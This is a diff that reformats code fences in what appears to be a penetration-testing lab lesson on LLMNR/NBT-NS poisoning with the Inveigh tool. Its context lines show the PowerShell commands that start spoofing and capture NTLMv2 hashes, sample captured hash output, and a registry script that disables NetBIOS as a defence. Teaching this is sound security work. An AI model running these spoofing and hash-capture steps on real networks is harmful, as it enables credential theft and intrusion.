@@ -14,8 +14,7 @@ We can get started with the PowerShell version as follows and then list all poss
 
 ## Using Inveigh
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\Inveigh.ps1
 PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
 
@@ -47,8 +46,7 @@ LLMNRTTL                System.Management.Automation.ParameterMetadata
 
 Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).
 
-```
-        powershell
+```powershell
 PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 
 [*] Inveigh 1.506 started at 2022-02-28T19:26:30
@@ -113,8 +111,7 @@ The PowerShell version of Inveigh is the original version and is no longer updat
 
 Let's go ahead and run the C# version with the defaults and start capturing hashes.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\Inveigh.exe
 
 [*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
@@ -161,8 +158,7 @@ As we can see, the tool starts and shows which options are enabled by default an
 
 We can hit the `esc` key to enter the console while Inveigh is running.
 
-```
-        powershell
+```powershell
 
 <SNIP>
 
@@ -181,8 +177,7 @@ C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
 
 After typing `HELP` and hitting enter, we are presented with several options:
 
-```
-        powershell
+```powershell
 
 =============================================== Inveigh Console Commands ===============================================
 
@@ -215,8 +210,7 @@ STOP                            | stop Inveigh
 
 We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
 
-```
-        powershell
+```powershell
 
 ================================================= Unique NTLMv2 Hashes =================================================
 
@@ -230,8 +224,7 @@ forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:01010000
 
 We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.
 
-```
-        powershell
+```powershell
 
 =================================================== NTLMv2 Usernames ===================================================
 
@@ -266,8 +259,7 @@ NBT-NS cannot be disabled via Group Policy but must be disabled locally on each 
 
 While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
 
-```
-        powershell
+```powershell
 
 $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
 Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
